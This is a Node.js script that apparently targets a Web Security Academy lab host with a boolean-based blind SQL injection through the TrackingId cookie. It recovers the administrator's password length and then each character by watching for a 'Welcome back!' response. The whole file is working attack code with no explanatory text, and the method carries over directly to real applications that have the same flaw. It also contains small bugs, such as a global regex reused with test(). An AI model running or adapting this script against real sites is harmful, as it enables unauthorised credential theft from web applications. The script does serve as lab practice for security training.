const utils = require('../utils');

const host = 'acdc1f591e755baa808a1b45001900c1.web-security-academy.net'
const responseMatchingTemplate = /Welcome back!/gm

const maxPasswordLength = 100


const headers = utils.stringToHeaders(`Host: ${host}`)

console.log('Starting blinded password search on host=%ss', host)

async function main() {
  console.log('Determining pasword length...')

  let [body, options] = await utils.async_https_get('https://' + host + '/', headers);
  const trackingId = utils.getHeaderValue(options, 'set-cookie', 'trackingId')
  const sessionId = utils.getHeaderValue(options, 'set-cookie', 'session')

  let exit = 0;
  let i = 0;
  for (i = 0; i < maxPasswordLength && !exit; i++) {
    const headerLenCookie = `TrackingId=${trackingId}' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = ${i + 1}-- ; session=${sessionId}`
    headers['Cookie'] = headerLenCookie;
    exit = responseMatchingTemplate.test(await utils.async_https_get('https://' + host + '/', headers))
  }

  const passwordLen = i
  console.log(`Password length detected: ${passwordLen}`)

  console.log('Determining pasword symbols...')
  let password = ''
  for (i = 0; i < passwordLen; i++) {
    for (let ascii = 32; ascii < 128; ascii++) {
      const headerLenCookie = `TrackingId=${trackingId}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${i + 1}, 1) = '${String.fromCharCode(ascii)}'-- ; session=${sessionId}`
      headers['Cookie'] = headerLenCookie;
      if (responseMatchingTemplate.test(await utils.async_https_get('https://' + host + '/', headers))) {
        password += String.fromCharCode(ascii)
        console.log('Password: %s', password)
        break
      }
    }
  }
}

main()